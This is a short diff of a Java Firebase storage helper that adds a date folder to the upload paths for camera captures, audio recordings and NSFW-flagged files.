@@ -103,7 +103,13 @@ public class FirebaseStorageHelper {
         }
 
         String fileName = "capture_" + date + "_" + timestamp + ".jpg";
-        String path = String.format("%s/%s/camera_capture/%s", userId, phoneModel, fileName);
+        // Include date in the path structure
+        String path = String.format("%s/%s/camera_capture/%s/%s",
+            userId,
+            phoneModel,
+            date,  // Add date folder
+            fileName
+        );
 
         StorageReference storageRef = storage.getReference().child(path);
         UploadTask uploadTask = storageRef.putBytes(captureData);
@@ -130,7 +136,13 @@ public class FirebaseStorageHelper {
         }
 
         String fileName = "audio_" + date + "_" + timestamp + ".mp3";
-        String path = String.format("%s/%s/audio_record/%s", userId, phoneModel, fileName);
+        // Include date in the path structure
+        String path = String.format("%s/%s/audio_record/%s/%s",
+            userId,
+            phoneModel,
+            date,  // Add date folder
+            fileName
+        );
 
         StorageReference storageRef = storage.getReference().child(path);
         UploadTask uploadTask = storageRef.putBytes(audioData);
@@ -199,9 +211,17 @@ public class FirebaseStorageHelper {
         String fileName = pathParts[pathParts.length - 1];
         
         String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+        String date = new SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(new Date());
         String newFileName = "nsfw_" + timestamp + "_" + fileName;
         
-        String path = String.format("%s/%s/nsfw_detected/%s", userId, phoneModel, newFileName);
+        // Include date in the path structure
+        String path = String.format("%s/%s/nsfw_detected/%s/%s", 
+            userId, 
+            phoneModel,
+            date,  // Add date folder
+            newFileName
+        );
+        
         StorageReference storageRef = storage.getReference().child(path);
         
         UploadTask uploadTask = storageRef.putBytes(compressedData);
